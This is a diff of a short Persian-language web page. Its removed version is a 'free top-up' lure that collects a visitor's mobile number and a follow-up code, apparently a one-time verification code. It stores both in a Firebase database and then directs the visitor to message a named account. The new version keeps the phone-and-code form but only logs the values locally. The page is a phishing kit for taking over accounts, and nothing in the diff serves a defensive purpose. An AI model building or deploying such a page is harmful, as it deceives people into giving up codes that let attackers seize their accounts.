@@ -4,27 +4,29 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>شارژ رایگان</title>
+<title>ثبت اطلاعات</title>
 
 <style>
 body{
     margin:0;
     background:#000;
-    color:#00ff66;
+    color:white;
     font-family:tahoma;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
+    text-align:center;
 }
 
 .box{
+    margin:80px auto;
     width:85%;
-    background:#111;
+    max-width:400px;
     padding:25px;
+    border:2px solid #00ff66;
     border-radius:20px;
-    box-shadow:0 0 25px #00ff66;
-    text-align:center;
+    box-shadow:0 0 20px #00ff66;
+}
+
+h1{
+    color:#00ff66;
 }
 
 input{
@@ -33,22 +35,23 @@ input{
     margin:10px;
     border-radius:10px;
     border:none;
-    font-size:18px;
+    font-size:16px;
 }
 
 button{
     width:95%;
     padding:15px;
     margin-top:15px;
-    border:0;
-    border-radius:10px;
     background:#00ff66;
-    color:#000;
+    border:none;
+    border-radius:10px;
     font-size:18px;
+    font-weight:bold;
 }
 
-#codeBox,#result{
-    display:none;
+#msg{
+    margin-top:20px;
+    color:#00ff66;
 }
 </style>
 
@@ -56,128 +59,41 @@ button{
 
 <body>
 
-
 <div class="box">
 
-<h2>🎁 شارژ رایگان</h2>
-
-<div id="phoneBox">
+<h1>ثبت شماره</h1>
 
 <input id="phone" placeholder="شماره موبایل">
 
-<button onclick="showCode()">ادامه</button>
-
-</div>
-
-
-<div id="codeBox">
-
 <input id="code" placeholder="کد">
 
-<button onclick="saveData()">ثبت</button>
+<button onclick="save()">ثبت اطلاعات</button>
+
+<div id="msg"></div>
 
 </div>
 
 
-<div id="result">
+<script>
 
-<h3>با تشکر 🌹</h3>
+function save(){
 
-<p>برای دریافت شارژ پیام دهید:</p>
-
-<h2>
-pv___mr15346
-</h2>
-
-</div>
-
-
-</div>
-
-
-
-<script type="module">
-
-import { initializeApp } 
-from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
-
-import { getDatabase, ref, push, set } 
-from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
-
-
-
-const firebaseConfig = {
-
-apiKey: "YOUR_API_KEY",
-
-authDomain: "YOUR_PROJECT.firebaseapp.com",
-
-databaseURL: "YOUR_DATABASE_URL",
-
-projectId: "YOUR_PROJECT_ID",
-
-storageBucket: "YOUR_BUCKET",
-
-messagingSenderId: "YOUR_ID",
-
-appId: "YOUR_APP_ID"
-
-};
-
-
-
-const app = initializeApp(firebaseConfig);
-
-const db = getDatabase(app);
-
-
-
-let userPhone="";
-
-
-
-window.showCode=function(){
-
-userPhone=document.getElementById("phone").value;
-
-document.getElementById("phoneBox").style.display="none";
-
-document.getElementById("codeBox").style.display="block";
-
-}
-
-
-
-window.saveData=function(){
-
+let phone=document.getElementById("phone").value;
 let code=document.getElementById("code").value;
 
-
-let newRef=push(ref(db,"users"));
-
-
-set(newRef,{
-
-phone:userPhone,
-
-code:code,
-
-time:new Date().toLocaleString()
-
-});
-
-
-
-document.getElementById("codeBox").style.display="none";
-
-document.getElementById("result").style.display="block";
-
-
+if(phone==""){
+document.getElementById("msg").innerHTML="شماره را وارد کنید";
+return;
 }
 
+document.getElementById("msg").innerHTML=
+"اطلاعات ثبت شد ✅";
+
+console.log(phone,code);
+
+}
 
 </script>
 
-
 </body>
-  </html>
+</html>
